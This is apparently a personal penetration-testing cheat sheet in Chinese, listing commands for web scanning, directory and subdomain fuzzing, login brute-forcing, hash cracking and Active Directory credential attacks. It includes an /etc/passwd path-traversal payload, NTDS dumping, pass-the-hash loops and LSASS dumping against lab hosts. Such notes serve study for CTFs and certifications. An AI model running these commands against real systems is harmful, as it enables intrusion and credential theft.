# 扫描工具 

**nikto**
```bash
 nikto -host 172.20.10.6
```


**wpscan (WordPress CMS)**
```bash
wpscan --url <URL> -e at -e ap -e u
-e --enumerate 枚举
at 枚举所有主题
ap 枚举所有插件
u 枚举用户名
vp 有漏洞的插件
```

```bash
wpscan --url http://192.168.15.135/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
wpscan --url https://192.168.55.128:12380/blogblog/ --enumerate ap --plugins-detection aggressive --disable-tls-checks
[+] wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive 
```


**dumpall （.git 目录泄露）**
```bash
~/tool/Python-3.7.12/python ~/tool/dumpall/dumpall.py -u http://192.168.55.137/.git
-----------------------------------------------------------
wget -r http:/xxxxxxxxxx/.git/
然后进入目录使用 git show 就可以查看被修改过的数据内容
```


**joomscan (Joomla CMS)**
```bash
joomscan -u 
```


**dig (dns , domain)**
```bash
dig <HOSTS> @192.168.55.7
```


**wfuzz** ： https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
```
└─$ wfuzz -c -z file,/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --hc 404,500  http://192.168.55.13/users/FUZZ

wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 --hl 7 http://192.168.55.25/?FUZZ=location.txt

wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 --hl 17 -d "FUZZ=secrettier360" http://192.168.55.25/wordpress/xmlrpc.php
发送post请求

wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie:PHPSESSID=hjtbh7acp0f0sg8ug6ia5eh4ff" --hh 1678 --hw 131
```
- 爆破子域名
```
wfuzz -u [URL] -H "HOST: FUZZ.xxxxxxx" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw [xx]
```
例: `wfuzz -u https://streamio.htb -H "HOST: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 24 `

**ffuf**
```bash
子域名爆破
ffuf -u http://10.129.237.11 -H "Host: FUZZ.editorial.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

- SSRF , 探测本地端口开放情况
burpsuite 抓包后整理 request 文件
```bash
ffuf -u http://editorial.htb/upload-cover -request request.req -w <( seq 0 65535) -ac
```

- 前端爆破
```bash
ffuf -u 'http://report.solarlab.htb:6791/login' -d 'username=FUZZ&password=asd' -w potential_user.txt -H "Content-Type: application/x-www-form-urlencoded" [--fs]

ffuf -u 'http://report.solarlab.htb:6791/login' -d 'username=USER&password=PASS' -w report_users.txt:USER -w possible_passwords.txt:PASS -H "Content-Type: application/x-www-form-urlencoded" -fs 2144
```


**Burpsuite FUZZ**
```
GET /test.php?[PASS]=../../../../../../../../../etc/passwd HTTP/1.1
```
字典路径 : SecLists/Discovery/Web-Content/common.txt




# 爆破工具
**feroxbuster** 
```bash
feroxbuster -u http://xxx -x php [-H "Authorization: Basic xxxxxxxxx"] -w Dir Path
```


**dirb** 
```bash
dirb http://192.168.55.19:8008/NickIzL33t /usr/share/wordlists/rockyou.txt -a "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15"
```


**dirsearch (有头部特殊要求的时候可以用 , 在设置里设置)**
```bash
dirsearch
```


**Gobuster 爆破 API**
- txt
```txt
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```
gobuster dir -u <URL> -w <PATH> -p txt
```


**Gobuster 目录爆破**
```bash
gobuster dir -u <URL> -w <Wordlist PATH> [-t 200] [--no-error] [-c <Cookie>] [-o]
```
如果要进行身份验证才能登录 web，那就添加参数: -U  Username -P  Passwd (或者用 cookie 也可以), 例
```bash
gobuster dir -u http://xxxxx -U admin -P admin -x php -w /usr/share/xxxxxx
```


**Hydra**
- 爆破前端表单
```bash
hydra 172.20.10.3 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l xekOnerR -P /usr/share/wordlists/rockyou.txt
```

- 爆破前端 GET [+ Base64]编码的验证方式：
`Authorization: Basic cXdlOnF3ZQ==`
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.163.201 http-get / [-m "Authorization: Basic %s"]
```

- -C 指定 `username:passwd` 的情况
```bash
hydra -C creds 192.168.55.20 https-port-form "/login.php:username=^USER^&password=^PASS^:Failed"
hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:failed" -I
```

- FTP
```bash
hydra -L list -P list ftp://[IP]
```

- pop3
```bash
hydra -s 55007 -L user.list -P /usr/share/wordlists/fasttrack.txt 192.168.55.6 pop3 -I
```

**John**
```bash
破解7z压缩包密码
7z2john 1 > 2.hash
john --format=7z 2.hash --wordlist /usr/share/wordlist/rockyou.txt

破解ssh私钥登录密码
ssh2john 1 > 2.hash
john 2.hash --wordlist /usr/share/wordlist/rockyou.txt

pfx password crack
pfx2john \$RLYS3KF.pfx > hash_raw

keepass2john tim.kdbx > hash_raw
```
[+] **注意** : 破解的时候指定字典要使用 **--wordlist**
```bash
john ./passwd --wordlist=/usr/share/wordlists/rockyou.txt
```

[+] **查看加密方式：**
![](photos/Pasted%20image%2020231224181528.png)
![](photos/Pasted%20image%2020240112002932.png)

[+]**明文反向加密成 NTLM**
```bash
└─$ iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05
```

优化爆破
```bash
--rules=best64
```


**crackmapexec / netexec**
```bash
crackmapexec ssh 172.20.10.3 -u creds -p creds [--]
crackmapexec smb streamio.htb -u username -p password [--continue-on-success] [--shares] [--no-bruteforce (只匹配对应的Username和password)]
crackmapexec ldap DOMAIN -u username -p password [-k] [--users]
crackmapexec smb hathor.windcorp.htb -d windcorp.htb -u BeatriceMill -p '!!!!ilovegood17' -k  --shares  (-d指定DOMAIN)
crackmapexec smb absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds (读取ntds 类似于secretsdump.py)
crackmapexec smb rebound.htb -u QWE -p '' --rid-brute > RID_raw   (爆破RID枚举域内用户名)
netexec smb 10.10.204.154 -u db_username -p password --local-auth   (域中的本地用户凭据枚举)
```


**aircrack-ng (WIFI)**
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
```


**hashcat**
https://hashcat.net/wiki/doku.php?id=example_hashes
- 单密码的情况  , ( -m 指定加密方式算法为0 [MD5] )
```bash
hashcat passwd /usr/share/wordlists/rockyou.txt -m 0 [--show]
```

- `admin:1a1a1a1a1a12d2d2d2d2s5s5s5s5` username:passwd 的情况 
```bash
hashcat creds /usr/share/wordlists/rockyou.txt --user -m 0 [--show]
```

查找加密(-m)
```bash
hashcat -h | grep []

hashcat passwd /usr/share/wordlists/rockyou.txt -m []
```

优化爆破，提高爆破率：
```bash
-r /usr/share/hashcat/rules/rockyou-30000.rule --force
-r /usr/share/hashcat/rules/best64.rule --force
```

创建规则，rockyou 的末尾增加数字 `1`
```bash
echo '$1' > rules.txt
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt -r ./rules.txt
```


**SMTP enum users**
```
perl smtp-user-enum-master/smtp-user-enum.pl -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.55.8
```


**ZIP PASSWD crack**
```bash
fcrackzip -u backup.zip -D -p /usr/share/wordlists/rockyou.txt
```

```
zip2john [FILE]
```


**密码生成工具： crunch**
[crunch(kali密码生成工具)----介绍与使用_kali crunch用法-CSDN博客](https://blog.csdn.net/qq_38319566/article/details/107737119)
```
crunch <min-len>  <max-len>  [<charset string>] [options]
-t 指定输出的格式
%      代表数字  
^      代表特殊符号  
@      代表小写字符  
,      代表大写字符
```

```bash
crunch 13 13 -t bev,%%@@^1995 -o password.txt
生成13长度的bev[一个大写字符][两个数字][两个小写字符][一个特殊符号]1995 ，保存到password.txt文件中
```


**.pfx 文件 key 爆破**
```
└─$ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
```


**kerbrute**
```bash
~/tool/kerbrute_linux_amd64 userenum -d htb.local --dc htb.local user_list
```


**getTGT.py**
``` bash
/usr/share/doc/python3-impacket/examples/getTGT.py
```

```bash
#!/bin/bash


while IFS='' read -r LINE || [ -n "${LINE}" ]
do
        echo "feed the Hash : ${LINE}"
        /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson@htb.local -hashes ${LINE}

done < backup/password_hash

```


**pypykatz （dump DMP file）**
```bash
pypykatz lsa minidump lsass.DMP
```


**lssasy (mimikatz)**
```bash
lsassy -d MS01.oscp.exam -u administrator -p December31 192.168.244.153
```


**MailSniper (outlook Web, Office 365, Exchange)**
[CMS 漏洞，攻击向量](CMS%20漏洞，攻击向量.md)